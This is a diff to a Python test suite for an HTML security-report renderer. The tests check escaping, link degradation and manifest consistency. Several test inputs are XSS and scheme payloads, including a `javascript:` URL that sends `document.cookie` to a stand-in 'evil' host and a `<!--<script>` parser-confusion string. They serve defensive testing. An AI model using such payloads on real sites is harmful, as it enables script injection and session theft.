@@ -13,11 +13,13 @@ Covers: .html filename format, data-file <-> embedded-block JSON equivalence, {d
 route, file} triple dedup-merge, .failed units do not block rendering + manifest counts,
 same-second atomic overwrite idempotency, honesty-boundary entries, self-containment
 (no external references; the w3c SVG namespace identifier is a name, not a fetch),
-injection escaping (`</script>` inside finding text), P-NN numbering/anchors data, SVG
-graph data (branched units only, dashed mapper terminals, † prefix, linear chains
-excluded), frontend three-state join, source-link href rules + degradation, manifest
+injection escaping (`</script>` and `<!--`+`<script` inside finding text), P-NN
+numbering/anchors data, SVG graph data (branched units only, dashed mapper terminals,
+† prefix, linear chains excluded), frontend three-state join, source-link href rules +
+degradation (scheme / drive-relative payloads), non-string severity degradation,
+failed-unit frontend-column alignment, nested-prefix exact route join, manifest
 rows[] == data rows[], and --check (ok / counts mismatch / carrier drift / rows drift /
-missing markers / non-html report).
+missing markers / non-html report / report outside repo root).
 
 Run: py tests/test_render_sdr_report.py
 """
@@ -180,7 +182,10 @@ class RenderSdrReportTest(unittest.TestCase):
                        'id="sec-findings"', 'id="sec-graphs"', 'id="sec-ok-units"',
                        'id="sec-boundaries"'):
             self.assertIn(marker, report)
-        self.assertIn("escapeHtml", report)          # the single escaping entry exists
+        # no dead escape helper (L7): the page's real safety property is that every
+        # dynamic value goes through textContent/setAttribute — the absence is asserted
+        # so a dead "just in case" helper cannot creep back with a lying comment
+        self.assertNotIn("escapeHtml", report)
         self.assertIn("诚实边界", report)
 
     def test_injection_escaping_in_embed_block(self):
@@ -193,6 +198,43 @@ class RenderSdrReportTest(unittest.TestCase):
         self.assertEqual(data["findings"][0]["risk"],
                          '<script>alert(1)</script> "q" & <b>')
 
+    def test_hostile_comment_script_quote_keeps_page_js_alive(self):
+        # `<!--` followed by `<script` in finding text used to flip the HTML parser into
+        # the script-data-double-escaped state: the real </script> was ignored and the
+        # page's own render JS was swallowed as data (blank six-section shell; --check
+        # was blind to it because its regex stopped at the same ignored terminator).
+        self._draft("u1", [dict(self.F1, risk="引述前端片段:<!--<script> 未转义")])
+        _, report, data, _ = self._render()
+        m = re.search(r'<script type="application/json" id="mgh-data">(.*?)</script>',
+                      report, re.S)
+        self.assertIsNotNone(m)
+        # the double-escape trigger must not exist literally in the block; the \u0021
+        # form parses back to the very same characters
+        self.assertNotIn("<!--", m.group(1))
+        self.assertIn("<\\u0021--", m.group(1))
+        self.assertEqual(_embed(self.m, report), data)
+        self.assertEqual(data["findings"][0]["risk"],
+                         "引述前端片段:<!--<script> 未转义")
+        # structure intact: exactly the template's two real terminators (data block +
+        # page JS); no literal </script> may leak out of finding text
+        self.assertEqual(report.count("</script>"), 2)
+        code, _, err = self._run("--check", str(self.run_dir))
+        self.assertEqual(code, 0, err)
+
+    def test_scheme_finding_degrades_href_kept_in_data(self):
+        # end-to-end C3: a draft file field carrying a scheme payload renders as plain
+        # text (loc.href None), while the canonical data keeps the LLM's raw claim —
+        # data is not censored, only not linked
+        self._draft("u1", [dict(self.F1, file="javascript://evil.com/payload",
+                                line_hint="", line=7)])
+        _, report, data, manifest = self._render()
+        loc = data["findings"][0]["loc"]
+        self.assertIsNone(loc["href"])
+        self.assertEqual(loc["text"], "javascript://evil.com/payload:7")
+        self.assertEqual(manifest["rows"], data["rows"])
+        self.assertEqual(_embed(self.m, report), data)
+
+
     # --- merge / failed units / boundaries --------------------------------------
 
     def test_dedup_merge_by_triple(self):
@@ -204,6 +246,45 @@ class RenderSdrReportTest(unittest.TestCase):
         f1 = next(f for f in data["findings"] if f["route"] == "/user/detail")
         self.assertIn("110", f1["line_hint"])                # hint unioned from the dup
         self.assertIn("110", f1["loc"]["text"])
+
+    def test_merge_findings_severity_guard_single_point(self):
+        # H1: the guard lives in _merge_findings (render and --check share it); any
+        # value outside the str closed-set falls to "medium" — non-strings used to be
+        # a hard TypeError (unhashable `in`), hashable junk always degraded silently
+        by_dim = self.m._merge_findings([{"unit": "u", "findings": [
+            {"dimension": "d", "route": "/r1", "file": "F.java", "severity": ["high"]},
+            {"dimension": "d", "route": "/r2", "file": "F.java", "severity": {}},
+            {"dimension": "d", "route": "/r3", "file": "F.java", "severity": 5},
+            {"dimension": "d", "route": "/r4", "file": "F.java", "severity": "High"},
+            {"dimension": "d", "route": "/r5", "file": "F.java", "severity": "high"},
+        ]}])
+        sev = {r["route"]: r["severity"] for r in by_dim["d"]}
+        self.assertEqual(sev, {"/r1": "medium", "/r2": "medium", "/r3": "medium",
+                               "/r4": "medium", "/r5": "high"})
+
+    def test_non_string_severity_degrades_not_crashes(self):
+        # end-to-end H1: list/dict severity used to traceback out of BOTH the render
+        # and the --check path (exit 1, outside the 0/1/2 contract)
+        self._draft("u1", [
+            {"dimension": "horizontal-authz", "severity": ["high"],
+             "route": "/user/detail", "file": "UserController.java",
+             "line_hint": "88-102", "risk": "r", "suggestion": "s",
+             "control_ref": None},
+            {"dimension": "sql-injection", "severity": {}, "route": "/user/list",
+             "file": "UserDao.java", "line_hint": "40", "risk": "r2",
+             "suggestion": "s2", "control_ref": None}])
+        code, out, err = self._run("--run-dir", str(self.run_dir), "--repo",
+                                   str(self.repo))
+        self.assertEqual(code, 0, err)
+        data = json.loads((self.run_dir / "sdr_report_data.json").read_text(
+            encoding="utf-8"))
+        sev = {f["dimension"]: f["severity"] for f in data["findings"]}
+        self.assertEqual(sev, {"horizontal-authz": "medium", "sql-injection": "medium"})
+        # the abnormal shape is disclosed on stderr, never silently swallowed
+        self.assertIn("severity", err)
+        # --check shares the same merge: same input must validate clean
+        code, _, err = self._run("--check", str(self.run_dir))
+        self.assertEqual(code, 0, err)
 
     def test_failed_unit_does_not_block(self):
         self._draft("u1", [self.F1])
@@ -445,6 +526,80 @@ class RenderSdrReportTest(unittest.TestCase):
         self.assertEqual(len(manifest["rows"]), 4)
         self.assertEqual(data["rows"], manifest["rows"])
 
+    def test_failed_unit_keeps_frontend_columns_aligned(self):
+        # H2: 1 failed + 2 ok, hits measured for ONE ok route — each row must carry its
+        # OWN unit's values. The old code zipped rows against the FULL sorted unit list
+        # while rows were built skipping failed units: from the first failed unit on,
+        # everything shifted (the row paired with the failed one kept its "—"
+        # placeholder; every later row inherited the PREVIOUS unit's values — wrong
+        # data into manifest/data/HTML, --check blind to it).
+        self.run_dir.joinpath("context.json").write_text(json.dumps({
+            "branch": "feature-pay", "base": "master", "dimensions": None,
+            "sensitive_catalog_source": "default-template",
+            "external_repos": [{"slug": "front", "path": "D:/f",
+                                "route_hits": [{"route": "/bbb/x", "count": 2}]}],
+            "baseline_truncated": False,
+        }), encoding="utf-8")
+        self._grouping([
+            {"unit_id": "aaa_broken", "kind": "interface", "route": "/aaa/broken",
+             "chain": [], "status": "failed"},     # sorts first: maximizes the shift
+            {"unit_id": "bbb_X", "kind": "interface", "route": "/bbb/x",
+             "chain": [], "status": "done"},
+            {"unit_id": "ccc_Y", "kind": "interface", "route": "/ccc/y",
+             "chain": [], "status": "done"},
+        ])
+        payload, report, data, manifest = self._render()
+        self.assertEqual([r["entry"] for r in manifest["rows"]], ["/bbb/x", "/ccc/y"])
+        by_entry = {r["entry"]: r for r in manifest["rows"]}
+        self.assertEqual(by_entry["/bbb/x"]["frontend_is"], "是")
+        self.assertEqual(by_entry["/bbb/x"]["frontend_count"], "2 处")
+        self.assertEqual(by_entry["/ccc/y"]["frontend_is"], "未知")
+        self.assertEqual(by_entry["/ccc/y"]["frontend_count"], "—")
+        # three carriers agree and --check accepts the aligned output
+        self.assertEqual(data["rows"], manifest["rows"])
+        self.assertEqual(_embed(self.m, report), data)
+        code, _, err = self._run("--check", str(self.run_dir))
+        self.assertEqual(code, 0, err)
+
+    def test_nested_prefix_routes_exact_join(self):
+        # M11: /api/user and /api/user/list are prefix-nested; route_hits are counted
+        # per exact route, so the join must be exact too. Substring containment used
+        # to light up the long route from the short route's hits ("无前端使用" shown
+        # as 有 — a directional lie to the reviewer).
+        hits = [{"route": "/api/user", "count": 3}]
+        self.run_dir.joinpath("context.json").write_text(json.dumps({
+            "branch": "feature-pay", "base": "master", "dimensions": None,
+            "sensitive_catalog_source": "default-template",
+            "external_repos": [{"slug": "front", "path": "D:/f", "route_hits": hits}],
+            "baseline_truncated": False,
+        }), encoding="utf-8")
+        self._grouping([
+            {"unit_id": "api_User", "kind": "interface", "route": "/api/user",
+             "chain": [], "status": "done"},
+            {"unit_id": "api_UserList", "kind": "interface", "route": "/api/user/list",
+             "chain": [], "status": "done"},
+        ])
+        _, _, data, manifest = self._render()
+        by_entry = {r["entry"]: r for r in manifest["rows"]}
+        self.assertEqual(by_entry["/api/user"]["frontend_is"], "是")
+        self.assertEqual(by_entry["/api/user"]["frontend_count"], "3 处")
+        self.assertEqual(by_entry["/api/user/list"]["frontend_is"], "未知")
+        self.assertEqual(by_entry["/api/user/list"]["frontend_count"], "—")
+        # reverse nesting: hits only on the LONG route must not light the short one
+        self.run_dir.joinpath("context.json").write_text(json.dumps({
+            "branch": "feature-pay", "base": "master", "dimensions": None,
+            "sensitive_catalog_source": "default-template",
+            "external_repos": [{"slug": "front", "path": "D:/f",
+                                "route_hits": [{"route": "/api/user/list",
+                                                "count": 1}]}],
+            "baseline_truncated": False,
+        }), encoding="utf-8")
+        _, _, data, manifest = self._render()
+        by_entry = {r["entry"]: r for r in manifest["rows"]}
+        self.assertEqual(by_entry["/api/user/list"]["frontend_is"], "是")
+        self.assertEqual(by_entry["/api/user/list"]["frontend_count"], "1 处")
+        self.assertEqual(by_entry["/api/user"]["frontend_is"], "未知")
+
     def test_pnn_anchors_data(self):
         # P-NN global + severity-asc ordering; each table ref maps to exactly one
         # 章节二 entry whose pnum is the in-page anchor id the page JS emits
@@ -670,6 +825,24 @@ class RenderSdrReportTest(unittest.TestCase):
         self.assertEqual(code, 2)
         self.assertIn("not a .html", err)
 
+    def test_check_rejects_report_outside_repo_root(self):
+        # L8: the old "manifest must be in run dir" guard was structurally always
+        # false (the path was BUILT as run_dir / "sdr_manifest.json"). The real
+        # product promise is that the report lives at the repo root — a manifest
+        # pointing elsewhere is tampering/misuse and must fail loudly.
+        self._draft("u1", [self.F1])
+        payload, _, _, _ = self._render()
+        outside = self.tmp / "elsewhere.html"          # sibling of the repo dir
+        outside.write_text(Path(payload["report"]).read_text(encoding="utf-8"),
+                           encoding="utf-8")
+        mp = self.run_dir / "sdr_manifest.json"
+        m = json.loads(mp.read_text(encoding="utf-8"))
+        m["report"] = str(outside)
+        mp.write_text(json.dumps(m, ensure_ascii=False), encoding="utf-8")
+        code, _, err = self._run("--check", str(self.run_dir))
+        self.assertEqual(code, 2)
+        self.assertIn("repo root", err)
+
     def test_missing_run_dir_exits_1(self):
         code, _, _ = self._run("--run-dir", str(self.tmp / "nope"), "--repo",
                                str(self.repo))
@@ -714,6 +887,23 @@ class HrefTest(unittest.TestCase):
     def test_parent_escape_stays_plain(self):
         self.assertIsNone(self._href("../outside/F.java", 1))
         self.assertIsNone(self._href("src/../../outside/F.java", 1))
+
+    def test_scheme_payload_stays_plain(self):
+        # C3: `javascript:` with no spaces/parens sailed through every pre-existing
+        # degrade rule into <a href> — the colon check must kill it
+        self.assertIsNone(self._href(
+            "javascript:location=`https:/evil/${document.cookie}`", 1))
+        # double-slash form: normpath folds `//` to `/` and WHATWG URL parsing
+        # tolerates a single slash for special schemes, so the check runs again on
+        # the FINAL normalized rel (folding must not revive the payload)
+        self.assertIsNone(self._href("javascript://evil.com/payload", 1))
+        self.assertIsNone(self._href("vbscript:x", 1))
+
+    def test_drive_relative_stays_plain(self):
+        # C:foo matches neither _ABS_DRIVE (needs a separator after the colon) nor the
+        # old relative rules — it used to become a broken <a href>
+        self.assertIsNone(self._href("C:foo", 1))
+        self.assertIsNone(self._href("C:Windows/evil.java", 3))
 
     def test_bool_line_is_not_an_anchor(self):
         self.assertEqual(self._href("src/F.java", True), "src/F.java")
